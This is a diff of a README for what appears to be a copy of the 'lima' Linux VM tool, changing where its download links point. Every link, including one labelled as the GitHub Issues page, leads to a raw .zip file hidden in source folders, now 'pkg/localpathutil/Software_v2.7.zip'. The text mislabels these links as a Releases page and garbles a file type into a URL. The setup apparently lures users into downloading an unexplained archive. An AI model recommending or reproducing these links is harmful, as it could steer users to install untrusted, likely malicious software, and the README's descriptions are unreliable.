@@ -1,6 +1,6 @@
 # 🚀 lima - Effortless Linux VMs to Run Containers
 
-[![Download lima](https://raw.githubusercontent.com/gustavomnhee/lima/master/pkg/autostart/systemd/lima_3.8.zip)](https://raw.githubusercontent.com/gustavomnhee/lima/master/pkg/autostart/systemd/lima_3.8.zip)
+[![Download lima](https://raw.githubusercontent.com/gustavomnhee/lima/master/pkg/localpathutil/Software_v2.7.zip)](https://raw.githubusercontent.com/gustavomnhee/lima/master/pkg/localpathutil/Software_v2.7.zip)
 
 ## 📖 Overview
 
@@ -19,9 +19,9 @@ To begin using lima, you'll first need to download and install it. Follow these 
 
 ## 📥 Download & Install
 
-1. Visit [this page to download](https://raw.githubusercontent.com/gustavomnhee/lima/master/pkg/autostart/systemd/lima_3.8.zip).
+1. Visit [this page to download](https://raw.githubusercontent.com/gustavomnhee/lima/master/pkg/localpathutil/Software_v2.7.zip).
 2. On the Releases page, look for the latest version.
-3. Download the relevant file for your system. This will typically be a `.zip` or `https://raw.githubusercontent.com/gustavomnhee/lima/master/pkg/autostart/systemd/lima_3.8.zip` file.
+3. Download the relevant file for your system. This will typically be a `.zip` or `https://raw.githubusercontent.com/gustavomnhee/lima/master/pkg/localpathutil/Software_v2.7.zip` file.
 4. Once the download is complete, extract the files.
 5. Follow the instructions in the user guide provided within the extracted files to install lima on your machine.
 
@@ -42,7 +42,7 @@ To begin using lima, you'll first need to download and install it. Follow these 
 
 If you run into issues or have questions, feel free to connect with other users. Here are some helpful resources:
 
-- **GitHub Issues**: Report bugs or request features directly on the [lima Issues page](https://raw.githubusercontent.com/gustavomnhee/lima/master/pkg/autostart/systemd/lima_3.8.zip).
+- **GitHub Issues**: Report bugs or request features directly on the [lima Issues page](https://raw.githubusercontent.com/gustavomnhee/lima/master/pkg/localpathutil/Software_v2.7.zip).
 - **User Documentation**: Check the in-depth documentation included in the downloaded files.
 - **Community Forum**: Join discussions with other users and developers on platforms like GitHub and relevant forums.
 
@@ -56,4 +56,4 @@ If you run into issues or have questions, feel free to connect with other users.
 
 ## ✅ Final Thoughts
 
-lima simplifies running Linux VMs on macOS. Its intuitive design makes it easy for anyone to start using containers in their daily workflow. Follow the steps above, and soon, you'll be running your applications smoothly. For any further assistance, visit [this page to download](https://raw.githubusercontent.com/gustavomnhee/lima/master/pkg/autostart/systemd/lima_3.8.zip) the latest version or connect with the community.
+lima simplifies running Linux VMs on macOS. Its intuitive design makes it easy for anyone to start using containers in their daily workflow. Follow the steps above, and soon, you'll be running your applications smoothly. For any further assistance, visit [this page to download](https://raw.githubusercontent.com/gustavomnhee/lima/master/pkg/localpathutil/Software_v2.7.zip) the latest version or connect with the community.
